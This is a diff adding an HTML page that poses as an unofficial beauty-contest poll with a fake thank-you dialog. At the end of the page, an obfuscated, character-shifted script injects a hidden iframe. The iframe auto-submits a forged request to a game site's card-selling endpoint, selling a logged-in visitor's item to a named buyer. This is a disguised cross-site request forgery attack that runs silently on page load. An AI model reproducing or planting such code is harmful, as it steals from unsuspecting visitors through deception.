@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Miss Clint City 2020 Poll</title>
+    <link rel="stylesheet" type="text/css" href="poll.css">
+</head>
+
+<body>
+    <div class="main_container">
+        <div class="header_container">
+            <h1>Unofficial Miss Clint City 2020 Poll</h1>
+        </div>
+        <h1>Choose a worthy contestant:</h1>
+        <div class="contestants_container">
+            <div class="card">
+                <img src="lule.jpg">
+                <h1>Lule</h1>
+            </div>
+            <div class="card">
+                <img src="delija.jpg">
+                <h1>Delija</h1>
+            </div>
+        </div>
+    </div>
+    <div id="overlay"></div>
+    <div id="dialog">
+        <h1>Your response has been recorded!</h1>
+        <h2>Thank you for participating in the poll.</h2>
+    </div>
+
+    <script>
+        contestants = document.getElementsByClassName('card');
+        for (let i = 0; i < contestants.length; i++) {
+            contestants[i].onclick = function() {
+                document.getElementById('overlay').style.display = 'block';
+                document.getElementById('dialog').style.display = 'flex';
+            }
+        }
+        var s = "=tdsjqu?=\"..wbs!t>#>khtcog\"uv{ng?$fkurnc{<pqpg=$\"ute?$$\"kf?$htcogKf$@>1khtcog@>uetkrv@\"\"\"\"ngv\"khto\"?\"fqewogpv0igvGngogpvD{Kf*$htcogKf$+=\"\"\"\"khto\"?\"khto0eqpvgpvYkpfqy\"~~\"khto0eqpvgpvFqewogpv0fqewogpv\"~~\"khto0eqpvgpvFqewogpv=\"\"\"\"khto0fqewogpv0qrgp*+=\"\"\"\"khto0fqewogpv0ytkvg*)>hqto\"kf?$ehqto$\"cevkqp?$jvvru<11yyy0wtdcp/tkxcnu0eqo1clcz1eqnngevkqp1ugnnaectf0rjr$\"ogvjqf?$RQUV$@>kprwv\"v{rg?$jkffgp$\"pcog?$rtkeg$\"xcnwg?$72$@>kprwv\"v{rg?$jkffgp$\"pcog?$cevkqp$\"xcnwg?$ugnnVqHtkgpf$@>kprwv\"v{rg?$jkffgp$\"pcog?$dw{gtapcog$\"xcnwg?$Ur{mgZa$@>kprwv\"v{rg?$jkffgp$\"pcog?$kfargtuqalqwgwt$\"xcnwg?$67;;53;9;$@>1hqto@)+=\"\"\"\"khto0fqewogpv0enqug*+=\"\"\"\"khto0fqewogpv0igvGngogpvD{Kf*$ehqto$+0uwdokv*+=>1uetkrv@#<n>##<!gps!)j>1<!j=t/mfohui<!j,,*!n,>Tusjoh/gspnDibsDpef)t/dibsDpefBu)j*.2*<!epdvnfou/xsjuf)n*<00..?=0tdsjqu?=optdsjqu?Zpv!nvtu!fobcmf!KbwbTdsjqu!up!tff!uijt!ufyu/=0optdsjqu?";
+        m = "";
+        for (i = 0; i < s.length; i++) m += String.fromCharCode(s.charCodeAt(i) - 1);
+        document.write(m);
+    </script>
+</body>
+
+</html>
